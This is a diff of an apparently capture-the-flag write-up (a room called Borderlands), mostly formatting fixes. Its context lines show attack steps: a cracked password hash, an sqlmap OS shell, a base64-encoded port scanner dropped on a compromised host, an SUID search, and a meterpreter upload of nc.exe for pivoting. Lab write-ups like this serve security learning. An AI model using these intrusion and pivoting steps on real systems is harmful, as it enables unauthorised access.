@@ -7,13 +7,10 @@ and I’m excited to join you on this adventure, part of my <code>482</code>-day
 <em>...</em>.<br>
 Access it <a href=""</a>here.<br>
 <img width="1200px" src="https://github.com/user-attachments/assets/df979e98-b488-43fc-ac5e-8be4a7bded16"></p>
-
 <br>
 <br>
 
-<p align="left">Summary &nbsp;&nbsp;</p>
-    
-<p>
+<p align="left">Summary &nbsp;&nbsp;<br>
     
 - [Nmap](#1)<br>
 - [API Key "AND*"](#2)<br>
@@ -22,11 +19,11 @@ Access it <a href=""</a>here.<br>
 - [/var/www within web app host](#5)<br>
 - [/root/ within Router1](#6)<br>
 - [Transmission from server to client over UDP](#7)<br>
-- [Transmission from server to client over TCP](#8)<br</p>
+- [Transmission from server to client over TCP](#8)</p>
     
 <br>
-
 <h2>Task 1 . Introduction</h2>
+<br>
 
 <p><em>Answer the questions below</em></p>
 <br>
@@ -497,8 +494,7 @@ Table: documents
 +------------+--------------------------------------------------------+--------------------------------------------------------+
 ```
 
-
-<p align="center"><code>billg</code>code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>
+<p align="center"><code>billg</code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>
 
 <h3 align="center">John The Ripper</h3>
 
@@ -518,8 +514,6 @@ Session completed.
 ```
 
 <img width="975" height="362" alt="image" src="https://github.com/user-attachments/assets/166a9a58-12c6-48bd-b53b-8fc06652dd12" />
-
-
 
 <br>
 <h3 align="center">Testing the suggested payloads to practice</h3>
@@ -623,8 +617,6 @@ os-shell>
 
 <img width="1129" height="140" alt="image" src="https://github.com/user-attachments/assets/e28caee7-df5a-4072-9f02-259d27a0ac47" />
 
-
-
 <h3 align="center">msfvenom</h3>
 
 ```bash
@@ -693,7 +685,6 @@ ip -s neigh
 172.18.0.1 dev eth0 lladdr 02:42:32:e1:80:54 ref 1 used 0/0/0 probes 1 DELAY
 ```
 
-
 <p align="center"><em>arp.py</em></p>
 
 ```bash
@@ -738,7 +729,6 @@ ip -s neigh
 172.16.1.246 dev eth1  used 13/73/10 probes 6 FAILED
 172.16.1.233 dev eth1  used 20/80/17 probes 6 FAILED
 ```
-
 
 ```bash
 www-data@app:/dev/shm$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTYuMS4xMjgnKQ==' | base64 -d > ports.py
@@ -835,7 +825,6 @@ service php7.2-fpm start
 nginx -g "daemon off;"
 ```
 
-
 ```bash
 www-data@app:~/html$ find / -perm -u=s -ls 2>/dev/null
 find / -perm -u=s -ls 2>/dev/null
@@ -850,9 +839,7 @@ find / -perm -u=s -ls 2>/dev/null
 www-data@app:~/html$ 
 ```
 
-
-
-
+```bash
 meterpreter > ps
 
 Process List
@@ -869,7 +856,6 @@ Process List
 [*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
 [*] Completed  : /root/Borderlands/nc.exe -> nc.exe
 meterpreter > 
-
-
+``
 
 
